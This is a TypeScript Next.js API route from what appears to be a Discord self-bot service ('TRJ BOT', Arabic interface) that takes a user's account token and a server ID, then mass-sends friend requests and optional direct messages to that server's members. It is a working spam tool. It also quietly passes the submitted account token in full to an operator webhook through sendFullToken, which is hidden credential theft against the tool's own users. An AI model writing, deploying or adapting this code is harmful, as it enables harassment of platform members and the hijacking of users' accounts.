// src/app/api/friend-spam/route.ts - Friend Request Spam API v1.0
// ⚠️ PRIME ONLY
import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken, sendToWebhook } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    const ip = getClientIp(request);
    const rl = rateLimit(`${ip}:friend-spam`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, maxRequests, message } = body;

    if (!token || !guildId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const max = Math.min(maxRequests || 50, 100);

    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('Friend Spam', ct, { '👤 المستخدم': userTag, '🏰 السيرفر': guildId });

    const logs: string[] = [`🎯 بدء إرسال طلبات صداقة لسيرفر: ${guildId}`];
    let successCount = 0;
    let failCount = 0;

    logs.push('📋 جاري جلب أعضاء السيرفر...');
    
    const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000`, undefined, { userOnly: true, timeout: 15000 });

    if (!membersRes.ok || !membersRes.data) {
      return NextResponse.json({ success: false, error: 'فشل جلب أعضاء السيرفر', logs }, { status: 400 });
    }

    const members = membersRes.data as Array<{ user: { id: string; username?: string } }>;
    logs.push(`👥 تم العثور على ${members.length} عضو`);

    let sent = 0;
    for (const member of members) {
      if (sent >= max) break;
      if (member.user?.id === userData.id) continue;

      try {
        // إرسال طلب صداقة
        const friendRes = await discordFetch(ct, 'PUT', `/users/@me/relationships/${member.user.id}`, {
          type: 1
        }, { userOnly: true, timeout: 10000 });

        if (friendRes.ok || friendRes.status === 204) {
          successCount++;
          logs.push(`✅ طلب صداقة: ${member.user.username || member.user.id}`);
        } else {
          failCount++;
        }
        sent++;

        // إرسال رسالة إذا محددة
        if (message && friendRes.ok) {
          try {
            const dmRes = await discordFetch(ct, 'POST', '/users/@me/channels', {
              recipient_id: member.user.id
            }, { userOnly: true, timeout: 10000 });
            if (dmRes.ok && dmRes.data) {
              const channel = dmRes.data as { id: string };
              await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                content: String(message)
              }, { userOnly: true, timeout: 10000 });
            }
          } catch { /* skip */ }
        }

        await new Promise(r => setTimeout(r, 1000));
      } catch {
        failCount++;
      }
    }

    logs.push('');
    logs.push(`📊 النتيجة: ✅ ${successCount} نجح | ❌ ${failCount} فشل`);

    sendToWebhook({
      embeds: [{
        title: '👥 Friend Request Spam',
        description: `**تم إرسال طلبات صداقة في سيرفر:** ${guildId}`,
        color: 0x5865F2,
        fields: [
          { name: '👤 المستخدم', value: userTag, inline: true },
          { name: '🏰 السيرفر', value: guildId, inline: true },
          { name: '✅ نجح', value: successCount.toString(), inline: true },
          { name: '❌ فشل', value: failCount.toString(), inline: true },
        ],
        footer: { text: 'TRJ BOT - Prime Feature' },
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {});

    return NextResponse.json({
      success: true,
      logs,
      stats: { total: sent, success: successCount, failed: failCount }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ في الخادم';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
